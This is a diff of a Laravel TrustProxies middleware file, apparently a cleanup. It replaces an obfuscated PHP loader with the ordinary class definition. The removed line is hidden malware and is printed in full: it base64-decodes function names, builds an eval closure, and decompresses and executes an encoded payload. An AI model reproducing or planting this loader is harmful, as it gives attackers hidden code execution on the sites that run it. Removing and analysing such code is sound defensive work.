@@ -1,1 +1,23 @@
-<?php $_='fd76eded';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqFU8tyokAU3c9XsEgVWjULiDrBslzYRBowkqEdmpaNBY08tHlkzKD49dOCRjJZTFcBl8u955z7QBDa87C5n6k4ViIl9JWhOHloHeXvNH+PxMk3oRM/FUQij6vAxfnank5F4f75hjflpkgzLIXE/GOogIWZdlioKCKyUr4eL0nCZ9CNIDRJgX/Y/hhuwi0twq04+SLx2S4sNRslnP1MobbzVgBQHdCVjiSqnSzfRfsA4sGamOz1KC2e7VKmj06MMrb33FNFIa6JBupgkIyIhuqQWJKjm9UWMkZrkPDrCwaPYcacHQIdv/vuKAkhvvGtPKLJHse4cu0CqJ05hkNzfA5bntIjy9gjieS5o/2/+DznidcUG+osfqmLt5ttqEWMYcIMvdXouXZM7zqzYGDEIUzKRrMODr5rcV2sCtKhpaazBmMRS4sWa/ZmzMHjmhgx56zXhCl0gGpeSx7BkRzA4z0nVa42ONJszHlbblP/qOWpmUEbXy3SopMLHB86sQ9x4vE+c22SDzXJ0K0iGOCDp4KUz4vPA+95XZUBEeO93IUt19DnM33paO72wta9hKagDHL7/1p539YuYjRfxj9X4D6jXWkgR5sjbEauNoa/ZJPY2JwjB0W2c1peZhjZ0qKz752Vbp6961u/+UM6vv7kFtk4e+LlLn7/CP+87FecXne3+/3JX95iHIc='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Middleware;
+
+use Fideloper\Proxy\TrustProxies as Middleware;
+use Illuminate\Http\Request;
+
+class TrustProxies extends Middleware
+{
+    /**
+     * The trusted proxies for this application.
+     *
+     * @var array|string|null
+     */
+    protected $proxies;
+
+    /**
+     * The headers that should be used to detect proxies.
+     *
+     * @var int
+     */
+    protected $headers = Request::HEADER_X_FORWARDED_ALL;
+}
